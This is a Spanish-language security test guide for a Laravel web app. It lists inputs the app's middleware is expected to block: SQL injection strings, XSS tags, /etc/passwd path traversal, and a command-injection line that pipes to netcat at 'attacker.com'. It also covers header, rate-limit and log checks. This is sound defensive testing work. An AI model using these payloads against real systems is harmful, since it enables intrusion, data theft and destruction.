# GUÍA DE PRUEBAS DE SEGURIDAD

## Pruebas de SQL Injection

### 1. Prueba en Campo Email (Login)
```
Email: test@example.com' OR '1'='1
Password: password123
Resultado Esperado: Error 422 - SQL injection detected
```

### 2. Prueba con UNION SELECT
```
Email: test@example.com' UNION SELECT * FROM users--
Password: password123
Resultado Esperado: Bloqueado por SqlInjectionProtection middleware
```

### 3. Prueba con DROP TABLE
```
Email: test@example.com'; DROP TABLE users;--
Password: password123
Resultado Esperado: Bloqueado - Patrón SQL peligroso detectado
```

### 4. Prueba con Query String
```
URL: /auth/status?user_id=1' OR '1'='1
Resultado Esperado: Error 422 o 403
```

---

## Pruebas de XSS

### 1. Script Tag en Nombre de Usuario (Registro)
```
Name: <script>alert('XSS')</script>
Email: xss@example.com
Password: SecurePass123!
Resultado Esperado: Error 422 - Invalid input o campo sanitizado
```

### 2. Event Handler en Email
```
Name: John Doe
Email: test@example.com" onclick="alert('XSS')
Password: SecurePass123!
Resultado Esperado: Bloqueado por XssProtection middleware
```

### 3. JavaScript Protocol
```
Name: <img src=x onerror="alert('XSS')">
Email: xss@example.com
Password: SecurePass123!
Resultado Esperado: Sanitizado o error 422
```

### 4. Data URL
```
Email: <a href="data:text/html,<script>alert('XSS')</script>">Click</a>
Resultado Esperado: Bloqueado
```

---

## Pruebas de Rate Limiting

### 1. Rate Limit en Login (5 intentos por minuto)
```
Ejecutar 6 requests POST /auth/login en menos de 1 minuto
Resultado Esperado: 6ta solicitud = Error 429 (Too Many Requests)
```

### 2. Rate Limit en Registro (5 intentos por minuto)
```
Ejecutar 6 requests POST /auth/register en menos de 1 minuto
Resultado Esperado: 6ta solicitud = Error 429
```

### 3. Rate Limit en Recuperar Contraseña (3 intentos por minuto)
```
Ejecutar 4 requests POST /auth/recover-password en menos de 1 minuto
Resultado Esperado: 4ta solicitud = Error 429
```

---

## Pruebas de Path Traversal

### 1. Intento de Path Traversal
```
URL: /../../etc/passwd
Resultado Esperado: Error 403 - Access denied, Path traversal detected
```

### 2. URL Encoded Path Traversal
```
URL: /%2e%2e/%2e%2e/etc/passwd
Resultado Esperado: Error 403
```

---

## Pruebas de Command Injection

### 1. Command Injection en Query String
```
URL: /search?q=test;cat /etc/passwd
Resultado Esperado: Error 403 - Attack detected
```

### 2. Pipe para Command Injection
```
URL: /search?q=test|nc attacker.com 4444
Resultado Esperado: Bloqueado por AttackDetection middleware
```

---

## Pruebas de Headers de Seguridad

### 1. Verificar CSP Header
```bash
curl -I https://renteria.local/
```
Buscar: `Content-Security-Policy: default-src 'self'...`

### 2. Verificar HSTS Header
```bash
curl -I https://renteria.local/
```
Buscar: `Strict-Transport-Security: max-age=31536000`

### 3. Verificar X-Frame-Options
```bash
curl -I https://renteria.local/
```
Buscar: `X-Frame-Options: DENY`

### 4. Verificar X-Content-Type-Options
```bash
curl -I https://renteria.local/
```
Buscar: `X-Content-Type-Options: nosniff`

---

## Pruebas de reCAPTCHA

### 1. Token reCAPTCHA Inválido
```json
{
  "email": "test@example.com",
  "password": "Test@1234",
  "recaptcha_token": "invalid_token_12345",
  "recaptcha_action": "auth_login"
}
```
Resultado Esperado: Error 422 - reCAPTCHA validation failed

### 2. Acción reCAPTCHA Incorrecta
```json
{
  "email": "test@example.com",
  "password": "Test@1234",
  "recaptcha_token": "valid_token_from_google",
  "recaptcha_action": "wrong_action"
}
```
Resultado Esperado: Error 422 - Action mismatch

---

## Pruebas de Validación de Contraseña

### 1. Contraseña sin Mayúscula
```
Password: test@1234
Resultado Esperado: Error 422 - Regex validation failed
```

### 2. Contraseña sin Símbolo Especial
```
Password: Test1234
Resultado Esperado: Error 422 - Regex validation failed
```

### 3. Contraseña Válida
```
Password: Test@1234
Resultado Esperado: Aceptada
```

---

## Pruebas de Validación de Email

### 1. Email no Único
```
Registrar usuario con: test@example.com
Intentar registrar otro con: test@example.com
Resultado Esperado: Error 422 - Email already exists
```

### 2. Email Inválido
```
Email: notanemail
Resultado Esperado: Error 422 - Invalid email format
```

---

## Pruebas de Validación de Nombre

### 1. Nombre con Caracteres Peligrosos
```
Name: <script>alert(1)</script>
Resultado Esperado: Error 422 - Regex validation failed
```

### 2. Nombre Válido
```
Name: José María García
Resultado Esperado: Aceptado
```

---

## Herramientas Recomendadas para Testing

### 1. Burp Suite Community
```
Descarga: https://portswigger.net/burp/communitydownload
- Proxy para interceptar requests
- Repeater para modificar y reenviar requests
- Scanner para encontrar vulnerabilidades
```

### 2. OWASP ZAP
```
Descarga: https://www.zaproxy.org/
- Similar a Burp pero open source
- Escaneo automático de vulnerabilidades
```

### 3. cURL / Postman
```bash
# Probar con cURL
curl -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"Test@1234","recaptcha_token":"test","recaptcha_action":"auth_login"}'
```

### 4. SQLMap (SOLO en ambiente de test)
```bash
# Nota: NUNCA en producción
sqlmap -u "http://localhost:8000/search?id=1" --dbs
```

---

## Cómo Revisar los Logs

### 1. En Linux/Mac
```bash
tail -f storage/logs/laravel.log
```

### 2. En Windows (PowerShell)
```powershell
Get-Content storage\logs\laravel.log -Wait
```

### 3. Buscar intentos de SQL Injection
```bash
grep "SQL Injection" storage/logs/laravel.log
```

### 4. Buscar intentos de XSS
```bash
grep "XSS Protection" storage/logs/laravel.log
```

### 5. Buscar intentos de Path Traversal
```bash
grep "Path traversal" storage/logs/laravel.log
```

---

## Checklist de Verificación

- [ ] CSP Header presente
- [ ] HSTS Header presente en HTTPS
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] SQL Injection bloqueado en login
- [ ] XSS bloqueado en registro
- [ ] Rate limiting funciona (6to intento rechazado)
- [ ] reCAPTCHA se valida correctamente
- [ ] Contraseñas débiles rechazadas
- [ ] Emails únicos validados
- [ ] Logs muestran intentos de ataque
- [ ] HTTPS forzado en producción
- [ ] Debug mode desactivado en producción
- [ ] Sessions seguras (HttpOnly, Secure, SameSite)
- [ ] Path traversal bloqueado

---

**Nota importante**: Todas estas pruebas deben realizarse en un ambiente de TEST, nunca en producción sin autorización.
